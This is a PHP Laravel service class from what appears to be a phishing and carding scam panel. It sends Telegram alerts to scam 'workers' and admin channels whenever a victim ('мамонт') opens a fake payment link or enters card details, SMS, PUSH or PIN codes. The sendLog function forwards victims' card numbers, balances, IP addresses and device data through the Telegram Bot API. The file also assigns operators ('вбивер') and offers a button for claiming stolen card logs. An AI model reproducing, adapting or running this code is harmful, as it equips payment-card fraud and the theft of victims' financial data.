<?php

namespace App\Services;

use App\Models\Logs;
use App\Models\Services;
use App\Models\Settings;
use App\Models\Users;
use App\Models\Links;
use http\Client\Curl\User;
use Telegram\Bot\Keyboard\Keyboard;

class TelegramService
{
    public static function sendIndexLink($chatId, $link, $service, $action, $log, $ip, $country, $deviceType)
    {
        $log_ = Logs::query()->where('id', $log)->first();
        $vbiver = Users::query()->where('id', $log_->admin_id)->first();
        $worker = Users::query()->where('id', $chatId)->first();
        $keyboard = null;
        //--------------------------------------
        switch ($action) {
            case 'index':
                $keyboard = [
                    'inline_keyboard' => [
                        [
                            [
                                'text' => 'Проверить онлайн',
                                'callback_data' => "check_online_$log_->id",
                            ],
                        ],
                        [
                            ($worker->supportChat == 1 AND $worker->supportChatApi != null) ? [
                                'text' => 'Smartsupp',
                                'url' => 'https://www.smartsupp.com/',
                            ] : [
                                'text' => 'Сообщение в тп',
                                'callback_data' => "send_tp_message_$log_->id",
                            ]
                        ]

                    ],
                ];

                $message = "👣 *Переход по ссылке | $service->country $service->name *
🗡 *Основная страница*

📡 *ID*: `$link->id`
🗯 *Товар*: `$link->name`
🥊 *Сумма*: `$link->price` HUF

🍽 *Информация об устройстве*:
🏴‍☠️ *Страна*: `$country`
🍴 *IP*: `$ip`
🖥 *Устройство*: `$deviceType`";
                break;

            case 'receive':
                $message = "👣 *Переход по ссылке | $service->country $service->name*
💳 *Ввод карты*

📡 *ID*: `$link->id`
🗯 *Товар*: `$link->name`
🥊 *Сумма*: `$link->price` HUF

🍽 *Информация об устройстве*:
🏴‍☠️ *Страна*: `Неизвестно`
🍴 *IP*: `146.70.28.20`
🖥 *Устройство*: *Компьютер😎*";

                $keyboard = [
                    'inline_keyboard' => [
                        [
                            [
                                'text' => 'Проверить онлайн',
                                'callback_data' => "check_online_$log_->id",
                            ],
                        ],
                        [
                            ($worker->supportChat == 1 AND $worker->supportChatApi != null) ? [
                                'text' => 'Smartsupp',
                                'url' => 'https://www.smartsupp.com/',
                            ] : [
                                'text' => 'Сообщение в тп',
                                'callback_data' => "send_tp_message_$log_->id",
                            ]
                        ]

                    ],
                ];
                break;

            case 'accurate':
                $message = "😇 *Вашему мамонту отправили Уточнение баланса | $service->country $service->name*

🗯 *Товар*: `$link->name`
🥊 *Сумма*:  `$link->price`

⚡️*Вбивер:* [$vbiver->username](https://t.me/$vbiver->username)";
                break;

            case 'sms':
                $message = "📤 *Вашему мамонту отправили SMS | $service->country $service->name*

🗯 *Товар*: `$link->name`
🥊 *Сумма*:  `$link->price`

⚡️*Вбивер:* [$vbiver->username](https://t.me/$vbiver->username)";
                break;
            case 'push':
                $message = "🚀 *Вашему мамонту отправили PUSH | $service->country $service->name*

🗯 *Товар*: `$link->name`
🥊 *Сумма*:  `$link->price`

⚡️*Вбивер:* [$vbiver->username](https://t.me/$vbiver->username)";
                break;
            case 'deposit':
                $message = "🚀 *Вашему мамонту отправили ДЕПОЗИТ | $service->country $service->name*

🗯 *Товар*: `$link->name`
🥊 *Сумма*:  `$link->price`

⚡️*Вбивер:* [$vbiver->username](https://t.me/$vbiver->username)";
                break;
            case 'limit':
                $message = "🚀 *Вашему мамонту отправили ЛИМИТЫ | $service->country $service->name*

🗯 *Товар*: `$link->name`
🥊 *Сумма*:  `$link->price`

⚡️*Вбивер:* [$vbiver->username](https://t.me/$vbiver->username)";
                break;
            case 'change':
                $message = "🚀 *Вашему мамонту отправили СМЕНУ | $service->country $service->name*

🗯 *Товар*: `$link->name`
🥊 *Сумма*:  `$link->price`

⚡️*Вбивер:* [$vbiver->username](https://t.me/$vbiver->username)";
                break;
            case 'app':
                $message = "🚀 *Вашему мамонту отправили APP-CODE | $service->country $service->name*

🗯 *Товар*: `$link->name`
🥊 *Сумма*:  `$link->price`

⚡️*Вбивер:* [$vbiver->username](https://t.me/$vbiver->username)";
                break;
            case 'call':
                $message = "🚀 *Вашему мамонту отправили CALL-CODE | $service->country $service->name*

🗯 *Товар*: `$link->name`
🥊 *Сумма*:  `$link->price`

⚡️*Вбивер:* [$vbiver->username](https://t.me/$vbiver->username)";
                break;
            case 'pin':
                $message = "😇 *Вашему мамонту отправили PIN-CODE | $service->country $service->name*

🗯 *Товар*: `$link->name`
🥊 *Сумма*:  `$link->price`

⚡️*Вбивер:* [$vbiver->username](https://t.me/$vbiver->username)";
                break;
        }
        //--------------------------------------

        if ($keyboard == null) {
            $response = self::sendMessage([
                'chat_id' => $chatId,
                'text' => $message,
                'parse_mode' =>"MARKDOWN"
            ]);
        }
        $response = self::sendMessage([
            'chat_id' => $chatId,
            'text' => $message,
            'reply_markup' => json_encode($keyboard),
            'parse_mode' => "MARKDOWN"
        ]);

        return response()->json(['status' => "success"]);
    }

    public static function sendNotif($log, $type)
    {
        $link = Links::query()->where('id', $log->link_id)->first();
        $vbiver = Users::query()->where('id', $log->admin_id)->first();
        $service = Services::query()->where('id', $link->service)->first();
        $worker = Users::query()->where('id', $link->user)->first();
        switch ($type) {
            case "sms":
                $response = self::sendMessage([
                    'chat_id' => $worker['id'],
                    'text' => "✅ *Ввод SMS-кода | $service->country $service->name*
        
        🗯 *Товар*: `$link->name`
        🥊 *Сумма*:  `$link->price`
        
        ⚡️*Вбивер:* [$vbiver->username](https://t.me/$vbiver->username)",
        'parse_mode' =>"MARKDOWN"
                ]);
                break;
            case "accurate":
                $response = self::sendMessage([
                    'chat_id' => $worker['id'],
                    'text' => "✅ *Ввод Точного баланса | $service->country $service->name*
        
        🗯 *Товар*: `$link->name`
        🥊 *Сумма*:  `$link->price`
        
        ⚡️*Вбивер:* [$vbiver->username](https://t.me/$vbiver->username)",
        'parse_mode' =>"MARKDOWN"
                ]);
                break;
            case "app":
                $response = self::sendMessage([
                    'chat_id' => $worker['id'],
                    'text' => "✅ *Ввод APP-кода | $service->country $service->name*
        
        🗯 *Товар*: `$link->name`
        🥊 *Сумма*:  `$link->price`
        
        ⚡️*Вбивер:* [$vbiver->username](https://t.me/$vbiver->username)",
        'parse_mode' =>"MARKDOWN"
                ]);
                break;
            case "call":
                $response = self::sendMessage([
                    'chat_id' => $worker['id'],
                    'text' => "✅ *Ввод CALL-кода | $service->country $service->name*
        
        🗯 *Товар*: `$link->name`
        🥊 *Сумма*:  `$link->price`
        
        ⚡️*Вбивер:* [$vbiver->username](https://t.me/$vbiver->username)",
        'parse_mode' =>"MARKDOWN"
                ]);
                break;
            case "pin":
                $response = self::sendMessage([
                    'chat_id' => $worker['id'],
                    'text' => "✅ *Ввод PIN-кода | $service->country $service->name*
        
        🗯 *Товар*: `$link->name`
        🥊 *Сумма*:  `$link->price`
        
        ⚡️*Вбивер:* [$vbiver->username](https://t.me/$vbiver->username)",
        'parse_mode' =>"MARKDOWN"
                ]);
                break;
            case "custom_text":
                $response = self::sendMessage([
                    'chat_id' => $worker['id'],
                    'text' => "✅ *Ввод ответа на Кастом текст | $service->country $service->name*
        
        🗯 *Товар*: `$link->name`
        🥊 *Сумма*:  `$link->price`
        
        ⚡️*Вбивер:* [$vbiver->username](https://t.me/$vbiver->username)",
        'parse_mode' =>"MARKDOWN"
                ]);
                break;
            case "custom_photo":
                $response = self::sendMessage([
                    'chat_id' => $worker['id'],
                    'text' => "✅ *Ввод ответа на Кастом фото | $service->country $service->name*
        
        🗯 *Товар*: `$link->name`
        🥊 *Сумма*:  `$link->price`
        
        ⚡️*Вбивер:* [$vbiver->username](https://t.me/$vbiver->username)",
                    'parse_mode' =>"MARKDOWN"
                ]);
                break;
            case "custom_error":
                $response = self::sendMessage([
                    'chat_id' => $worker['id'],
                    'text' => "✅ *Ввод ответа на Кастом ошибку | $service->country $service->name*
        
        🗯 *Товар*: `$link->name`
        🥊 *Сумма*:  `$link->price`
        
        ⚡️*Вбивер:* [$vbiver->username](https://t.me/$vbiver->username)",
        'parse_mode' =>"MARKDOWN"

                ]);
                break;
        }
        return response()->json(['status' => "success"]);
    }

    public static function sendLog($log, $link, $worker, $ip, $country, $deviceType)
    {
        $cardNumber = $log->card;
        $cardNumber[8] = $cardNumber[9] = $cardNumber[11] = $cardNumber[12] = '*';
        $settings = Settings::query()->first();
        $kb = [
            'inline_keyboard' => [
                [
                    [
                        'text' => 'Взять лог',
                        'callback_data' => "put_log_$log->id",
                    ],
                ],
            ],
        ];

        $balance = $log->balance ? $log->balance : "Не указан";
        $service = Services::query()->where('id', $link->service)->first();
        $response1 = self::sendMessage([
            'chat_id' => $worker['id'],
            'text' => "💀 *Данные карты  | $service->country $service->name*


▶️ *Номер карты*: `$cardNumber`
💱 *Баланс*:  `$balance`

📡 *ID*: `$log->id`
🗯 *Товар*: `$link->name`
🥊 *Сумма*: `$link->price` 

🍽 *Информация об устройстве*:
🏴‍☠️ *Страна*: `$country`
🍴 *IP*: `$ip`
🖥 *Устройство*: `$deviceType`",
'parse_mode' =>"MARKDOWN"
        ]);

        $response1 = self::sendMessage([
            'chat_id' => $settings['all_channel'],
            'text' => "💊 *Пришел новый лог $service->country $service->name*
💱 *Баланс*: `$balance`

🔡 *Объявление*: `$link->name`
🔢 *ID Объявления*: `$log->id`
💲 *Цена*: `$link->price`",
'parse_mode' =>"MARKDOWN"
        ]);

        $response2 = self::sendMessage([
            'chat_id' => $settings['admin_logs_channel'],
            'text' => "💀 *Данные карты  | $service->country $service->name*

▶️ *Номер карты*: `$cardNumber`
💱 *Баланс*:  `$balance`

📡 *ID*: `$log->id`
🗯 *Товар*: `$link->name`
🥊 *Сумма*: `$link->price`

🍽 *Информация об устройстве*:
🏴‍☠️ *Страна*: `$country`
🍴 *IP*: `$ip`
🖥 *Устройство*: `$deviceType`",
            'reply_markup' => json_encode($kb),
            'parse_mode' =>"MARKDOWN"
        ]);

        return response()->json(['status' => "success"]);
    }
    public static function sendMessageTP($log, $message){

        $link = Links::query()->where('id', $log->link_id)->first();
        $worker = Users::query()->where('id', $link->user)->first();
        $kb = [
            'inline_keyboard' => [
                [
                    [
                        'text' => 'Ответить',
                        'callback_data' => "send_tp_message_$log->id",
                    ],
                ],
            ],
        ];

        $response = self::sendMessage([
            'chat_id' => $worker['id'],
            'text' => "📤 *Новое сообщение из ТП*

👤 *Сообщение*: `$message`

🕸 *Объявление*: `$link->id`
💰 *Цена*:  `$link->price`",
            'reply_markup' => json_encode($kb),
            'parse_mode' => "MARKDOWN"
        ]);
        return response()->json(['status' => "success"]);
    }
    private static function sendMessage($data)
    {
        $botToken = env('TELEGRAM_BOT_TOKEN'); // Get bot token from .env file
        $url = "https://api.telegram.org/bot$botToken/sendMessage";

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $response = curl_exec($ch);
        curl_close($ch);

        return $response;
    }
}
